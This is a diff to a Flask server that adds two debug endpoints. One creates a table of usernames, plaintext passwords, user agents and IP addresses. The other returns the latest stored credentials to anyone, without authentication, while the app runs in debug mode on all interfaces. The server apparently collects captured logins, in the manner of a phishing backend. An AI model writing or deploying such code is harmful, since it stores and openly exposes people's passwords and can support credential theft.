@@ -136,8 +136,111 @@ def server_logs():
         logger.error(f"Error getting server logs: {e}")
         return jsonify({'error': str(e)}), 500
     
+@app.route('/test', methods=['GET'])
+def test_endpoint():
+    """Test endpoint for debugging"""
+    try:
+        import traceback
+        from database import get_connection
+        
+        # Database connection test
+        conn = get_connection()
+        cursor = conn.cursor()
+        
+        # 1. Table mavjudligini tekshirish
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logs'")
+        table_exists = cursor.fetchone()
+        
+        # 2. Table yaratish
+        if not table_exists:
+            cursor.execute('''
+                CREATE TABLE logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    username TEXT NOT NULL,
+                    password TEXT NOT NULL,
+                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                    user_agent TEXT,
+                    ip_address TEXT
+                )
+            ''')
+            conn.commit()
+        
+        # 3. Rowlar soni
+        cursor.execute("SELECT COUNT(*) FROM logs")
+        count = cursor.fetchone()[0]
+        
+        conn.close()
+        
+        return jsonify({
+            'status': 'success',
+            'message': 'Test endpoint working',
+            'table_exists': table_exists is not None,
+            'row_count': count,
+            'timestamp': datetime.now().isoformat()
+        }), 200
+        
+    except Exception as e:
+        import traceback
+        error_details = traceback.format_exc()
+        logger.error(f"Test endpoint error: {e}\n{error_details}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e),
+            'traceback': error_details
+        }), 500
 
+@app.route('/logs_debug', methods=['GET'])
+def logs_debug():
+    """Debug uchun soddalashtirilgan logs endpoint"""
+    try:
+        from database import get_connection
+        
+        conn = get_connection()
+        cursor = conn.cursor()
+        
+        # Simple query
+        cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 10")
+        rows = cursor.fetchall()
+        
+        # Convert to list
+        logs_list = []
+        for row in rows:
+            logs_list.append({
+                'id': row[0],
+                'username': row[1],
+                'password': row[2],
+                'timestamp': row[3],
+                'user_agent': row[4],
+                'ip_address': row[5]
+            })
+        
+        # Simple stats
+        cursor.execute("SELECT COUNT(*) FROM logs")
+        total = cursor.fetchone()[0]
+        
+        cursor.execute("SELECT COUNT(*) FROM logs WHERE date(timestamp) = date('now')")
+        today = cursor.fetchone()[0]
+        
+        conn.close()
+        
+        return jsonify({
+            'status': 'success',
+            'total': total,
+            'today': today,
+            'logs': logs_list,
+            'message': f'Found {len(logs_list)} logs'
+        }), 200
+        
+    except Exception as e:
+        import traceback
+        logger.error(f"Logs debug error: {e}\n{traceback.format_exc()}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e),
+            'message': 'Database error'
+        }), 500
 
 if __name__ == '__main__':
 
     app.run(host='0.0.0.0', port=5000, debug=True)
+
